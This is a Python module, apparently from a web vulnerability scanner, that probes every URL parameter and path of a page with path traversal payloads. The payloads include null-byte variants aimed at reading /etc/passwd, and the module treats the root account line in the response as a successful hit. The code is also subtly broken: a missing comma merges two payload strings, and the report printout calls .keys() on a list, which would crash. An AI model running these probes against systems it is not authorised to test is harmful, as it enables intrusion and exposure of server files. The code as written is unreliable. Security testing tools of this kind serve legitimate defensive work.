from utils import dict_iterate, update_url_params, get_url_query
from client import NotAPage, RedirectedToExternal
from compat import urljoin

INJECTIONS = (
    "../etc/passwd"
    "../../../../../../../../../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//....//....//....//....//etc/passwd",
    "../../../../../../../../../../../../../../../../etc/passwd%00",
    "....//....//....//....//....//....//....//....//....//....//etc/passwd%00"
)

def lfi(page, client):
    query = get_url_query(page.url)
    report = []
    for param, value in dict_iterate(query):
        successed = []
        for injection in INJECTIONS:
            injected_url = update_url_params(page.url, {param: injection})

            if check_injection(injected_url, client):
                successed.append(injection)

        if successed:
            report.append({'param': param, 'injections': successed})

    successed = []
    for injection in INJECTIONS:
        if check_injection(urljoin(page.url, injection), client):
            successed.append(injection)

    if successed:
        report.append({'param': '/', 'injections': successed})

    if report:
        print('LFI in url {}. params {}'.format(page.url, report.keys()))

    return report


def check_injection(injected_url, client):
    try:
        res_page = client.get(injected_url)
    except (NotAPage, RedirectedToExternal) as e:
        return False

    if "root:x:0:0:root:/root:/bin/bash" in res_page.html:
        return True

    return False